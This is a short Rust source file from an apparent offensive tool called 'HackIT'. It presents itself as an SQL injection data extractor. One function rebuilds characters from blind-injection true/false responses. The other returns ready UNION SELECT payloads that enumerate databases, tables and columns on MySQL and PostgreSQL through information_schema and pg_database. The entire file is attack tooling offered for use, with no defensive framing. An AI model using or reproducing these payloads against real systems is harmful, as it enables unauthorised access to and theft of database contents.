/*
 * HackIT SQLi Data Extractor (Rust)
 * Advanced bit-shifting and binary search logic for Blind SQLi.
 */

use std::ffi::{CStr, CString};
use std::os::raw::c_char;

pub struct ExtractorResult {
    pub char_found: char,
    pub index: usize,
}

/**
 * Advanced Blind SQLi Extraction Logic
 */
pub fn extract_blind_char(index: usize, start_bit: usize, end_bit: usize, responses: Vec<bool>) -> char {
    let mut val = 0u8;
    for (i, &success) in responses.iter().enumerate() {
        if success {
            val |= 1 << (start_bit + i);
        }
    }
    val as char
}

#[no_mangle]
pub unsafe extern "C" fn rust_extract_blind_data(index: usize, bits_raw: *const c_char) -> *mut c_char {
    let bits_str = unsafe { CStr::from_ptr(bits_raw) }.to_str().unwrap_or("");
    let bits: Vec<bool> = bits_str.chars().map(|c| c == '1').collect();
    
    let c = extract_blind_char(index, 0, bits.len(), bits);
    
    let result = format!("CHAR:{}", c);
    CString::new(result).unwrap().into_raw()
}

#[no_mangle]
pub unsafe extern "C" fn rust_generate_dump_payloads(dbms: *const c_char, target: *const c_char) -> *mut c_char {
    let dbms_str = unsafe { CStr::from_ptr(dbms) }.to_str().unwrap_or("mysql").to_lowercase();
    let target_str = unsafe { CStr::from_ptr(target) }.to_str().unwrap_or("dbs").to_lowercase();
    
    let payload = match (dbms_str.as_str(), target_str.as_str()) {
        ("mysql", "dbs") => "UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
        ("mysql", "tables") => "UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()",
        ("mysql", "columns") => "UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{T}'",
        ("postgresql", "dbs") => "UNION SELECT string_agg(datname, ',') FROM pg_database",
        _ => "UNION SELECT 'EXTRACT_FAIL'",
    };
    
    CString::new(payload).unwrap().into_raw()
}
